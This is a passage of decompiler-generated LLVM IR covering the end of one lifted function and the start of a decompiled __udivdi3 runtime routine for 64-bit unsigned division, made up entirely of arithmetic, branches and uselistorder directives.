  %v2_1763c = phi i32 [ %v2_1749c, %bb180 ], [ %v2_17528, %bb195 ]
  %v2_17530 = add i32 %v2_1763c, -1
  %v3_17530 = lshr i32 -2147483648, %v2_17530
  %v6_17530 = shl i32 %v1_174a4, %v2_1763c
  %v1_17534 = sub i32 32, %v2_1763c
  %v7_17538 = lshr i32 %v0_172b8, %v1_17534
  %v8_17538 = or i32 %v7_17538, %v6_17530
  %v6_1753c = shl i32 %v2_17300, %v2_1763c
  %v6_17540 = lshr i32 %v2_17300, %v1_17534
  %v7_17544 = lshr i32 %v0_17170, %v1_17534
  %v8_17544 = or i32 %v7_17544, %v6_1753c
  %v3_17548 = udiv i32 %v8_17538, 65536
  %v2_17558 = udiv i32 %v6_17540, %v3_17548
  %v3_17568 = urem i32 %v6_17540, %v3_17548
  store i32 %v3_17568, i32* %r1.global-to-local, align 4
  %v3_17574 = urem i32 %v8_17538, 65536
  %v2_17578 = mul i32 %v3_17574, %v2_17558
  store i32 %v8_17544, i32* %r0.global-to-local, align 4
  %v3_17580 = udiv i32 %v8_17544, 65536
  %v4_17584 = mul nuw i32 %v3_17568, 65536
  %v5_17584 = or i32 %v4_17584, %v3_17580
  %v9_17588 = icmp eq i32 %v2_17578, %v5_17584
  %v4_1758c = and i32 %v3_17530, %v0_172b8
  %v6_1758c = shl i32 %v0_172b8, %v2_1763c
  %v2_17590 = icmp eq i32 %v4_1758c, 0
  %v3_17590 = or i1 %v9_17588, %v2_17590
  br i1 %v3_17590, label %dec_label_pc_175a8, label %dec_label_pc_17594

dec_label_pc_17594:                               ; preds = %dec_label_pc_17530
  %v2_17598 = add i32 %v5_17584, %v8_17538
  %v3_17598 = icmp ult i32 %v2_17598, %v5_17584
  %v1_1759c = add i32 %v2_17558, -1
  br i1 %v3_17598, label %dec_label_pc_175a8, label %dec_label_pc_1768c

dec_label_pc_175a8:                               ; preds = %.thread126, %dec_label_pc_17594, %dec_label_pc_17530
  %v1_175a8 = phi i32 [ %v5_17584, %dec_label_pc_17530 ], [ %v2_17598, %dec_label_pc_17594 ], [ %v1_175a841, %.thread126 ]
  %stack_var_-52.0 = phi i32 [ %v2_17558, %dec_label_pc_17530 ], [ %v1_1759c, %dec_label_pc_17594 ], [ %v4_17698.v1_1759c, %.thread126 ]
  %v2_175a8 = sub i32 %v1_175a8, %v2_17578
  %v2_175b4 = udiv i32 %v2_175a8, %v3_17548
  %v3_175c4 = urem i32 %v2_175a8, %v3_17548
  store i32 %v3_175c4, i32* %r1.global-to-local, align 4
  %v2_175c8 = mul i32 %v2_175b4, %v3_17574
  %v3_175d4 = urem i32 %v8_17544, 65536
  %v4_175d8 = mul nuw i32 %v3_175c4, 65536
  %v5_175d8 = or i32 %v4_175d8, %v3_175d4
  store i32 %v5_175d8, i32* %r0.global-to-local, align 4
  %tmp229 = icmp ugt i32 %v2_175c8, %v5_175d8
  br i1 %tmp229, label %dec_label_pc_175e4, label %dec_label_pc_175f0

dec_label_pc_175e4:                               ; preds = %dec_label_pc_175a8
  %v2_175e4 = add i32 %v5_175d8, %v8_17538
  store i32 %v2_175e4, i32* %r0.global-to-local, align 4
  %v3_175e4 = icmp ult i32 %v2_175e4, %v5_175d8
  %v1_175e8 = add i32 %v2_175b4, -1
  br i1 %v3_175e4, label %dec_label_pc_175f0, label %dec_label_pc_1767c

dec_label_pc_175f0:                               ; preds = %dec_label_pc_175a8, %dec_label_pc_1767c, %bb213, %dec_label_pc_175e4
  %v0_175f8 = phi i32 [ %v5_17684, %bb213 ], [ %v1_175e8, %dec_label_pc_175e4 ], [ %v2_175b4, %dec_label_pc_175a8 ], [ %v1_175e8, %dec_label_pc_1767c ]
  %v1_175f4 = phi i32 [ %v6_17680, %bb213 ], [ %v2_175e4, %dec_label_pc_175e4 ], [ %v5_175d8, %dec_label_pc_175a8 ], [ %v2_175e4, %dec_label_pc_1767c ]
  %v2_175f4 = sub i32 %v1_175f4, %v2_175c8
  %v4_175f8 = mul i32 %stack_var_-52.0, 65536
  %v5_175f8 = or i32 %v0_175f8, %v4_175f8
  %v3_175fc = udiv i32 %v5_175f8, 65536
  %v3_17600 = udiv i32 %v6_1758c, 65536
  %tmp230 = mul i32 %v3_175fc, -65536
  %v5_17604 = add i32 %tmp230, -1
  %v6_17604 = and i32 %v5_175f8, %v5_17604
  %tmp231 = mul i32 %v3_17600, -65536
  %v5_17608 = add i32 %tmp231, -1
  %v6_17608 = and i32 %v6_1758c, %v5_17608
  %v2_1760c = mul i32 %v6_17604, %v6_17608
  %v2_17610 = mul i32 %v3_175fc, %v6_17608
  store i32 %v2_17610, i32* %r1.global-to-local, align 4
  %v2_17614 = mul i32 %v6_17604, %v3_17600
  %v2_17618 = mul nuw i32 %v3_175fc, %v3_17600
  %v2_1761c = add i32 %v2_17614, %v2_17610
  store i32 %v2_1761c, i32* %r0.global-to-local, align 4
  %v3_1761c = icmp ult i32 %v2_1761c, %v2_17610
  br i1 %v3_1761c, label %bb197, label %bb198

bb197:                                            ; preds = %dec_label_pc_175f0
  %v2_17620 = add i32 %v2_17618, 65536
  br label %bb198

bb198:                                            ; preds = %dec_label_pc_175f0, %bb197
  %v0_17628 = phi i32 [ %v2_17618, %dec_label_pc_175f0 ], [ %v2_17620, %bb197 ]
  %v4_17624 = mul i32 %v2_1761c, 65536
  %v5_17624 = add i32 %v4_17624, %v2_1760c
  %v2_17628 = and i32 %v2_1761c, 32768
  %v3_17628 = icmp ne i32 %v2_17628, 0
  %v4_17628 = udiv i32 %v2_1761c, 65536
  %v7_17628 = zext i1 %v3_17628 to i32
  %v6_17628 = add nuw nsw i32 %v7_17628, %v4_17628
  %v8_17628 = add i32 %v6_17628, %v0_17628
  %v3_1762c = icmp ult i32 %v2_175f4, %v8_17628
  br i1 %v3_1762c, label %dec_label_pc_17654, label %dec_label_pc_17634

dec_label_pc_17634:                               ; preds = %bb198
  %v9_1762c = icmp eq i32 %v2_175f4, %v8_17628
  %. = zext i1 %v9_1762c to i32
  %v7_1763c = shl i32 %v0_17170, %v2_1763c
  %v9_1763c = icmp uge i32 %v5_17624, %v7_1763c
  %v15_1763c = icmp eq i32 %v5_17624, %v7_1763c
  %v2_17640 = xor i1 %v9_1763c, true
  %v3_17640 = or i1 %v15_1763c, %v2_17640
  br i1 %v3_17640, label %bb201, label %bb202

bb201:                                            ; preds = %dec_label_pc_17634
  br label %bb202

bb202:                                            ; preds = %dec_label_pc_17634, %bb201
  %v4_17644 = phi i32 [ %., %dec_label_pc_17634 ], [ 0, %bb201 ]
  %v2_17644 = xor i1 %v15_1763c, true
  %v3_17644 = and i1 %v9_1763c, %v2_17644
  br i1 %v3_17644, label %bb203, label %thread-pre-split

bb203:                                            ; preds = %bb202
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb202, %bb203
  %v2_17648 = icmp eq i32 %v4_17644, 0
  br i1 %v2_17648, label %bb204, label %dec_label_pc_17654

bb204:                                            ; preds = %thread-pre-split
  store i32 %v5_175f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17284

dec_label_pc_17654:                               ; preds = %bb198, %thread-pre-split
  %v1_17654 = add i32 %v5_175f8, -1
  store i32 %v1_17654, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17284

dec_label_pc_17660:                               ; preds = %dec_label_pc_17180
  %v3_17664 = icmp ugt i32 %v0_172b8, 16777214
  %v9_17664 = icmp eq i32 %v0_172b8, 16777215
  %v2_17668 = xor i1 %v9_17664, true
  %v3_17668 = and i1 %v3_17664, %v2_17668
  br i1 %v3_17668, label %bb206, label %bb207

bb206:                                            ; preds = %dec_label_pc_17660
  br label %bb207

bb207:                                            ; preds = %dec_label_pc_17660, %bb206
  %v1_1719c55 = phi i32 [ 16777215, %dec_label_pc_17660 ], [ 24, %bb206 ]
  %v2_1766c = xor i1 %v3_17664, true
  %v3_1766c = or i1 %v9_17664, %v2_1766c
  br i1 %v3_1766c, label %bb208, label %bb209

bb208:                                            ; preds = %bb207
  br label %bb209

bb209:                                            ; preds = %bb207, %bb208
  %v1_1719c54 = phi i32 [ %v1_1719c55, %bb207 ], [ 16, %bb208 ]
  br i1 %v3_17668, label %bb210, label %bb211

bb210:                                            ; preds = %bb209
  br label %bb211

bb211:                                            ; preds = %bb209, %bb210
  %v0_171ac59 = phi i32 [ %v0_171ac60, %bb209 ], [ 8, %bb210 ]
  br i1 %v3_1766c, label %bb212, label %bb152

bb212:                                            ; preds = %bb211
  br label %bb152

dec_label_pc_1767c:                               ; preds = %dec_label_pc_175e4
  %tmp232 = icmp ugt i32 %v2_175c8, %v2_175e4
  br i1 %tmp232, label %bb213, label %dec_label_pc_175f0

bb213:                                            ; preds = %dec_label_pc_1767c
  %v6_17680 = add i32 %v2_175e4, %v8_17538
  store i32 %v6_17680, i32* %r0.global-to-local, align 4
  %v5_17684 = add i32 %v2_175b4, -2
  br label %dec_label_pc_175f0

dec_label_pc_1768c:                               ; preds = %dec_label_pc_17594
  %tmp233 = icmp ugt i32 %v2_17578, %v2_17598
  br i1 %tmp233, label %bb214, label %.thread126

bb214:                                            ; preds = %dec_label_pc_1768c
  %v5_17690 = add i32 %v2_17558, -2
  %v6_17694 = add i32 %v2_17598, %v8_17538
  br label %.thread126

.thread126:                                       ; preds = %dec_label_pc_1768c, %bb214
  %v4_17698124 = phi i32 [ %v5_17690, %bb214 ], [ %v1_1759c, %dec_label_pc_1768c ]
  %v1_175a841 = phi i32 [ %v6_17694, %bb214 ], [ %v2_17598, %dec_label_pc_1768c ]
  %v4_17698.v1_1759c = select i1 %tmp233, i32 %v4_17698124, i32 %v1_1759c
  br label %dec_label_pc_175a8

dec_label_pc_176a0:                               ; preds = %dec_label_pc_173b4
  %tmp234 = icmp ugt i32 %v2_17398, %v2_173b4
  br i1 %tmp234, label %bb215, label %dec_label_pc_173c0

bb215:                                            ; preds = %dec_label_pc_176a0
  %v5_176a4 = add i32 %v2_17384, -2
  %v6_176a8 = add i32 %v2_173b4, %v6_17318
  store i32 %v6_176a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_173c0

dec_label_pc_176b0:                               ; preds = %dec_label_pc_1736c
  %tmp235 = icmp ugt i32 %v2_17354, %v2_1736c
  br i1 %tmp235, label %bb216, label %dec_label_pc_17378

bb216:                                            ; preds = %dec_label_pc_176b0
  %v5_176b4 = add i32 %v2_17338, -2
  %v6_176b8 = add i32 %v2_1736c, %v6_17318
  br label %dec_label_pc_17378

; uselistorder directives
  uselistorder i32 %v6_176a8, { 1, 0 }
  uselistorder i1 %tmp233, { 1, 0 }
  uselistorder i32 %v6_17680, { 1, 0 }
  uselistorder i32 %v1_1719c54, { 1, 0 }
  uselistorder i1 %v9_17664, { 1, 0 }
  uselistorder i32 %v1_17654, { 1, 0 }
  uselistorder i1 %v9_1763c, { 1, 0 }
  uselistorder i32 %v7_1763c, { 1, 0 }
  uselistorder i32 %v2_1761c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_17610, { 1, 0, 2 }
  uselistorder i32 %v3_17600, { 2, 1, 0 }
  uselistorder i32 %v3_175fc, { 2, 1, 0 }
  uselistorder i32 %v5_175f8, { 3, 4, 1, 0, 2 }
  uselistorder i32 %v2_175e4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v5_175d8, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v2_175c8, { 0, 2, 1 }
  uselistorder i32 %v2_175b4, { 2, 1, 3, 0 }
  uselistorder i32 %v1_1759c, { 1, 0, 2 }
  uselistorder i32 %v2_17598, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v6_1758c, { 1, 0 }
  uselistorder i32 %v5_17584, { 1, 2, 0, 3 }
  uselistorder i32 %v3_17574, { 1, 0 }
  uselistorder i32 %v2_17558, { 1, 3, 2, 0 }
  uselistorder i32 %v3_17548, { 2, 3, 1, 0 }
  uselistorder i32 %v8_17538, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v2_17528, { 1, 0 }
  uselistorder i32 %v0_17528, { 1, 0 }
  uselistorder i32 %v6_1751c, { 1, 0 }
  uselistorder i1 %v2_17508, { 1, 0 }
  uselistorder i1 %v7_17504, { 1, 2, 0 }
  uselistorder i32 %v0_172f877118, { 1, 0 }
  uselistorder i1 %v7_174ec, { 1, 0 }
  uselistorder i32 %v0_1714c104, { 1, 0 }
  uselistorder i32 %v0_17150107, { 1, 0 }
  uselistorder i32 %v6_174c0, { 1, 2, 0 }
  uselistorder i32 %v0_17150103, { 1, 0, 3, 2 }
  uselistorder i1 %v3_174a4, { 1, 0 }
  uselistorder i32 %v2_1749c, { 1, 0 }
  uselistorder i32 %v0_1749c, { 1, 0 }
  uselistorder i32 %v6_17490, { 1, 0 }
  uselistorder i1 %v2_1747c, { 1, 0 }
  uselistorder i1 %v9_17478, { 1, 2, 0 }
  uselistorder i32 %v5_17460, { 1, 0 }
  uselistorder i32 %v5_17440, { 2, 1, 0, 3 }
  uselistorder i32 %v2_17420, { 2, 1, 3, 0 }
  uselistorder i32 %v2_173fc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v5_173f0, { 2, 3, 1, 0 }
  uselistorder i32 %v2_173e8, { 2, 0, 1 }
  uselistorder i32 %v2_173d4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_17418, { 1, 0, 3, 2 }
  uselistorder i32 %v0_173d0, { 1, 0 }
  uselistorder i32 %v2_173b4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v5_173a8, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v2_17398, { 0, 2, 1 }
  uselistorder i32 %v2_17384, { 2, 1, 3, 0 }
  uselistorder i32 %v2_1736c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_17360, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17354, { 0, 2, 1 }
  uselistorder i32 %v3_17350, { 0, 2, 1 }
  uselistorder i32 %v2_17338, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v3_17328, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v6_17318, { 2, 3, 6, 4, 5, 1, 0 }
  uselistorder i32 %v6_172f4, { 1, 0 }
  uselistorder i32 %v0_172f8, { 1, 0 }
  uselistorder i1 %v9_172d4, { 1, 0 }
  uselistorder i32 %v0_17318, { 10, 9, 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 %v0_1729c, { 0, 2, 1, 3 }
  uselistorder i32 %v5_17244, { 2, 1, 0, 3 }
  uselistorder i32 %v2_17224, { 2, 1, 3, 0 }
  uselistorder i32 %v2_17200, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v5_171f4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_171ec, { 2, 0, 1 }
  uselistorder i32 %v3_171e8, { 1, 0 }
  uselistorder i32 %v2_171d0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_1721c, { 2, 3, 0, 1 }
  uselistorder i32 %v1_17250, { 1, 2, 3, 0 }
  uselistorder i32 %v7_171b8, { 1, 0 }
  uselistorder i32 %v6_171a8, { 1, 0 }
  uselistorder i32 %v0_171ac, { 1, 0 }
  uselistorder i1 %v7_17188, { 1, 0 }
  uselistorder i32 %v0_17170, { 7, 8, 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 %v2_17300, { 9, 10, 8, 4, 3, 5, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_172b8, { 7, 8, 14, 2, 15, 13, 3, 11, 4, 0, 5, 6, 9, 10, 12, 1 }
  uselistorder i32 %v0_171ac60, { 3, 1, 0, 2 }
  uselistorder i32 %v1_174a4, { 5, 6, 2, 12, 11, 4, 7, 3, 8, 9, 10, 0, 1, 13 }
  uselistorder i32 %v0_17150108, { 2, 0, 1 }
  uselistorder i32 %v0_17150, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1714c, { 1, 0 }
  uselistorder i32 %v0_17134, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 10, 9, 3, 11, 12, 13, 1, 6, 0, 5, 14, 15, 16, 17, 4, 2, 18, 19, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 9, 8, 10, 11, 12, 13, 14, 16, 2, 17, 18, 19, 20, 4, 21, 22, 1, 23, 5, 24, 25, 26, 27, 28, 0, 29, 15, 3 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %bb211, { 1, 0 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_17654, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb202, { 1, 0 }
  uselistorder label %bb198, { 1, 0 }
  uselistorder label %dec_label_pc_175f0, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_17530, { 1, 0 }
  uselistorder label %bb195, { 1, 0 }
  uselistorder label %bb193, { 1, 0 }
  uselistorder label %bb191, { 1, 0 }
  uselistorder label %bb189, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb185, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_174a4, { 1, 0 }
  uselistorder label %bb180, { 1, 0 }
  uselistorder label %bb178, { 1, 0 }
  uselistorder label %bb176, { 1, 0 }
  uselistorder label %bb174, { 1, 0 }
  uselistorder label %bb171, { 3, 2, 1, 0 }
  uselistorder label %.thread116, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_173cc, { 1, 0 }
  uselistorder label %dec_label_pc_173c0, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_17378, { 2, 1, 3, 0 }
  uselistorder label %bb167, { 0, 1, 3, 2 }
  uselistorder label %bb165, { 1, 0 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_172c8, { 1, 0 }
  uselistorder label %dec_label_pc_172a4, { 1, 0 }
  uselistorder label %dec_label_pc_17284, { 2, 1, 0, 3, 5, 4 }
  uselistorder label %dec_label_pc_1727c, { 2, 0, 1 }
  uselistorder label %bb158, { 3, 2, 1, 0 }
  uselistorder label %.thread114, { 3, 1, 2, 0 }
  uselistorder label %bb155, { 1, 0 }
  uselistorder label %bb152, { 0, 1, 3, 2 }
  uselistorder label %.thread112, { 1, 0 }
  uselistorder label %bb149, { 1, 0 }
  uselistorder label %dec_label_pc_17164, { 2, 0, 1 }
}

define i64 @__udivdi3(i64 %n, i64 %d) local_unnamed_addr {
entry:
  %tmp = trunc i64 %d to i32
  %tmp87 = trunc i64 %n to i32
  %v27_176c8 = load i32, i32* @lr, align 4
  %v0_176dc = load i32, i32* @r3, align 4
  %v2_176dc = icmp eq i32 %v0_176dc, 0
  %v0_176ec = load i32, i32* @r2, align 4
  br i1 %v2_176dc, label %dec_label_pc_176f8, label %dec_label_pc_177f4

dec_label_pc_176f8:                               ; preds = %entry
  %tmp172 = icmp ugt i32 %v0_176ec, %tmp
  br i1 %tmp172, label %dec_label_pc_17700, label %dec_label_pc_17868

dec_label_pc_17700:                               ; preds = %dec_label_pc_176f8
  %v3_17704 = icmp ult i32 %v0_176ec, 65534
  br i1 %v3_17704, label %dec_label_pc_17b98, label %dec_label_pc_17708

dec_label_pc_17708:                               ; preds = %dec_label_pc_17700
  %v3_1770c = icmp ugt i32 %v0_176ec, 16777214
  %v9_1770c = icmp eq i32 %v0_176ec, 16777215
  %v2_17710 = xor i1 %v9_1770c, true
  %v3_17710 = and i1 %v3_1770c, %v2_17710
  br i1 %v3_17710, label %bb, label %bb104

bb:                                               ; preds = %dec_label_pc_17708
  br label %bb104

bb104:                                            ; preds = %dec_label_pc_17708, %bb
  %v1_1772035 = phi i32 [ 16777215, %dec_label_pc_17708 ], [ 24, %bb ]
  %v2_17714 = xor i1 %v3_1770c, true
  %v3_17714 = or i1 %v9_1770c, %v2_17714
  br i1 %v3_17714, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_1772034 = phi i32 [ %v1_1772035, %bb104 ], [ 16, %bb105 ]
  br i1 %v3_17710, label %bb107, label %bb108

bb107:                                            ; preds = %bb106
  store i32 8, i32* @ip, align 4
  br label %bb108

bb108:                                            ; preds = %bb106, %bb107
  br i1 %v3_17714, label %bb109, label %bb110

bb109:                                            ; preds = %bb108
  store i32 16, i32* @ip, align 4
  br label %bb110

bb110:                                            ; preds = %bb167, %.thread76, %bb108, %bb109
  %v1_17720 = phi i32 [ 8, %bb167 ], [ 0, %.thread76 ], [ %v1_1772034, %bb108 ], [ %v1_1772034, %bb109 ]
  %v6_17720 = lshr i32 %v0_176ec, %v1_17720
  %v4_17728 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.748 to i32), i32 36) to i32*), align 4
  %v2_1772c = add i32 %v4_17728, %v6_17720
  %v3_1772c = inttoptr i32 %v2_1772c to i8*
  %v4_1772c = load i8, i8* %v3_1772c, align 1
  %v6_1772c = zext i8 %v4_1772c to i32
  %v0_17730 = load i32, i32* @ip, align 4
  %v2_17730 = sub i32 %v0_17730, %v6_1772c
  %v9_17730 = icmp eq i32 %v0_17730, %v6_1772c
  br i1 %v9_17730, label %.thread2, label %bb112

bb112:                                            ; preds = %bb110
  %v7_17734 = shl i32 %tmp, %v2_17730
  %v2_17738 = sub i32 32, %v2_17730
  %v7_1773c = shl i32 %v0_176ec, %v2_17730
  %v8_17740 = lshr i32 %tmp87, %v2_17738
  %v9_17740 = or i32 %v8_17740, %v7_17734
  br label %.thread2

.thread2:                                         ; preds = %bb110, %bb112
  %v0_17760 = phi i32 [ %tmp, %bb110 ], [ %v9_17740, %bb112 ]
  %v1_177d4 = phi i32 [ %v0_176ec, %bb110 ], [ %v7_1773c, %bb112 ]
  %v3_17744 = udiv i32 %v1_177d4, 65536
  br i1 %v9_17730, label %bb114, label %bb113

bb113:                                            ; preds = %.thread2
  %v7_17750 = shl i32 %tmp87, %v2_17730
  br label %bb114

bb114:                                            ; preds = %.thread2, %bb113
  %v0_177c0 = phi i32 [ %tmp87, %.thread2 ], [ %v7_17750, %bb113 ]
  %v2_17754 = udiv i32 %v0_17760, %v3_17744
  %v3_17764 = urem i32 %v0_17760, %v3_17744
  %v3_1776c = urem i32 %v1_177d4, 65536
  %v2_17770 = mul i32 %v2_17754, %v3_1776c
  %v3_17774 = udiv i32 %v0_177c0, 65536
  %v4_17778 = mul nuw i32 %v3_17764, 65536
  %v5_17778 = or i32 %v4_17778, %v3_17774
  %tmp173 = icmp ugt i32 %v2_17770, %v5_17778
  br i1 %tmp173, label %dec_label_pc_17784, label %.thread70

dec_label_pc_17784:                               ; preds = %bb114
  %v2_17784 = add i32 %v5_17778, %v1_177d4
  %v3_17784 = icmp ult i32 %v2_17784, %v5_17778
  %v1_17788 = add i32 %v2_17754, -1
  br i1 %v3_17784, label %.thread70, label %dec_label_pc_17790

dec_label_pc_17790:                               ; preds = %dec_label_pc_17784
  %tmp174 = icmp ugt i32 %v2_17770, %v2_17784
  br i1 %tmp174, label %bb115, label %.thread70

bb115:                                            ; preds = %dec_label_pc_17790
  %v5_17794 = add i32 %v2_17754, -2
  %v6_17798 = add i32 %v2_17784, %v1_177d4
  br label %.thread70

.thread70:                                        ; preds = %bb114, %dec_label_pc_17790, %dec_label_pc_17784, %bb115
  %v1_177e8 = phi i32 [ %v1_17788, %dec_label_pc_17784 ], [ %v2_17754, %bb114 ], [ %v5_17794, %bb115 ], [ %v1_17788, %dec_label_pc_17790 ]
  %v1_1779c = phi i32 [ %v2_17784, %dec_label_pc_17784 ], [ %v5_17778, %bb114 ], [ %v6_17798, %bb115 ], [ %v2_17784, %dec_label_pc_17790 ]
  %v2_1779c = sub i32 %v1_1779c, %v2_17770
  %v2_177a8 = udiv i32 %v2_1779c, %v3_17744
  %v3_177b8 = urem i32 %v2_1779c, %v3_17744
  %v2_177bc = mul i32 %v2_177a8, %v3_1776c
  %v3_177c4 = urem i32 %v0_177c0, 65536
  %v4_177c8 = mul nuw i32 %v3_177b8, 65536
  %v5_177c8 = or i32 %v4_177c8, %v3_177c4
  %tmp175 = icmp ugt i32 %v2_177bc, %v5_177c8
  br i1 %tmp175, label %dec_label_pc_177d4, label %bb117

dec_label_pc_177d4:                               ; preds = %.thread70
  %v2_177d4 = add i32 %v5_177c8, %v1_177d4
  %v3_177d4 = icmp ult i32 %v2_177d4, %v5_177c8
  %v1_177d8 = add i32 %v2_177a8, -1
  br i1 %v3_177d4, label %bb117, label %dec_label_pc_177e0

dec_label_pc_177e0:                               ; preds = %dec_label_pc_177d4
  %tmp176 = icmp ugt i32 %v2_177bc, %v2_177d4
  br i1 %tmp176, label %bb116, label %bb117

bb116:                                            ; preds = %dec_label_pc_177e0
  %v5_177e4 = add i32 %v2_177a8, -2
  br label %bb117

bb117:                                            ; preds = %.thread70, %dec_label_pc_177d4, %dec_label_pc_177e0, %bb116
  %v0_177e8 = phi i32 [ %v1_177d8, %dec_label_pc_177d4 ], [ %v2_177a8, %.thread70 ], [ %v1_177d8, %dec_label_pc_177e0 ], [ %v5_177e4, %bb116 ]
  %v4_177e8 = mul i32 %v1_177e8, 65536
  %v5_177e8 = or i32 %v0_177e8, %v4_177e8
  br label %dec_label_pc_17854

dec_label_pc_177f4:                               ; preds = %entry
  %v4_177f4 = icmp uge i32 %v0_176dc, %tmp
  %v10_177f4 = icmp eq i32 %tmp, %v0_176dc
  %v2_177fc = xor i1 %v10_177f4, true
  %v3_177fc = and i1 %v4_177f4, %v2_177fc
  br i1 %v3_177fc, label %dec_label_pc_1784c, label %dec_label_pc_17800

dec_label_pc_17800:                               ; preds = %dec_label_pc_177f4
  %v3_17804 = icmp ult i32 %v0_176dc, 65534
  br i1 %v3_17804, label %dec_label_pc_17a24, label %dec_label_pc_17808

dec_label_pc_17808:                               ; preds = %dec_label_pc_17800
  %v3_1780c = icmp ugt i32 %v0_176dc, 16777214
  %v9_1780c = icmp eq i32 %v0_176dc, 16777215
  %v2_17810 = xor i1 %v9_1780c, true
  %v3_17810 = and i1 %v3_1780c, %v2_17810
  br i1 %v3_17810, label %bb119, label %bb120

bb119:                                            ; preds = %dec_label_pc_17808
  br label %bb120

bb120:                                            ; preds = %dec_label_pc_17808, %bb119
  %v1_1781812 = phi i32 [ 16777215, %dec_label_pc_17808 ], [ 24, %bb119 ]
  %v2_17814 = xor i1 %v3_1780c, true
  %v3_17814 = or i1 %v9_1780c, %v2_17814
  br i1 %v3_17814, label %bb121, label %bb122

bb121:                                            ; preds = %bb120
  br label %bb122

bb122:                                            ; preds = %bb120, %bb121
  %v1_17818 = phi i32 [ %v1_1781812, %bb120 ], [ 16, %bb121 ]
  %v2_17818 = add nsw i32 %v1_17818, -1
  %v3_17818 = shl i32 1, %v2_17818
  %v4_17818 = and i32 %v3_17818, %v0_176dc
  %v5_17818 = icmp ne i32 %v4_17818, 0
  %v6_17818 = lshr i32 %v0_176dc, %v1_17818
  %v4_17820 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.748 to i32), i32 36) to i32*), align 4
  %v2_17824 = add i32 %v4_17820, %v6_17818
  %v3_17824 = inttoptr i32 %v2_17824 to i8*
  %v4_17824 = load i8, i8* %v3_17824, align 1
  %v6_17824 = zext i8 %v4_17824 to i32
  %v3_17828 = and i1 %v5_17818, %v2_17810
  br i1 %v3_17828, label %bb123, label %bb124

bb123:                                            ; preds = %bb122
  br label %bb124

bb124:                                            ; preds = %bb122, %bb123
  %v0_1783014 = phi i32 [ %v27_176c8, %bb122 ], [ 8, %bb123 ]
  %v2_1782c = xor i1 %v5_17818, true
  %v3_1782c = or i1 %v9_1780c, %v2_1782c
  br i1 %v3_1782c, label %bb125, label %bb126

bb125:                                            ; preds = %bb124
  br label %bb126

bb126:                                            ; preds = %bb124, %bb125
  %v0_17830 = phi i32 [ %v0_1783014, %bb124 ], [ 16, %bb125 ]
  %v2_17830 = sub i32 %v0_17830, %v6_17824
  %v9_17830 = icmp eq i32 %v0_17830, %v6_17824
  br i1 %v9_17830, label %dec_label_pc_17838, label %dec_label_pc_17a50

dec_label_pc_17838:                               ; preds = %bb126, %bb150
  %v3_17838 = icmp uge i32 %tmp, %v0_176dc
  %v2_1783c = xor i1 %v3_17838, true
  %v3_1783c = or i1 %v10_177f4, %v2_1783c
  br i1 %v3_1783c, label %bb128, label %bb129

bb128:                                            ; preds = %dec_label_pc_17838
  %v7_1783c = icmp ult i32 %tmp87, %v0_176ec
  br i1 %v7_1783c, label %dec_label_pc_1784c, label %.thread3

bb129:                                            ; preds = %dec_label_pc_17838
  br i1 %v3_17838, label %.thread3, label %dec_label_pc_1784c

.thread3:                                         ; preds = %bb128, %bb129
  br label %dec_label_pc_17854

dec_label_pc_1784c:                               ; preds = %bb128, %bb129, %dec_label_pc_177f4
  br label %dec_label_pc_17854

dec_label_pc_17854:                               ; preds = %.thread3, %bb159, %dec_label_pc_17b74, %bb142, %bb117, %dec_label_pc_1784c
  %v2_17854 = phi i32 [ %v5_17b18, %bb159 ], [ 1, %.thread3 ], [ %v1_17b74, %dec_label_pc_17b74 ], [ %v5_17a18, %bb142 ], [ %v5_177e8, %bb117 ], [ 0, %dec_label_pc_1784c ]
  %v3_17858 = sext i32 %v2_17854 to i64
  ret i64 %v3_17858

dec_label_pc_17868:                               ; preds = %dec_label_pc_176f8
  %v2_17868 = icmp eq i32 %v0_176ec, 0
  br i1 %v2_17868, label %dec_label_pc_17870, label %dec_label_pc_17880

dec_label_pc_17870:                               ; preds = %dec_label_pc_17868
  br label %dec_label_pc_17880

dec_label_pc_17880:                               ; preds = %dec_label_pc_17868, %dec_label_pc_17870
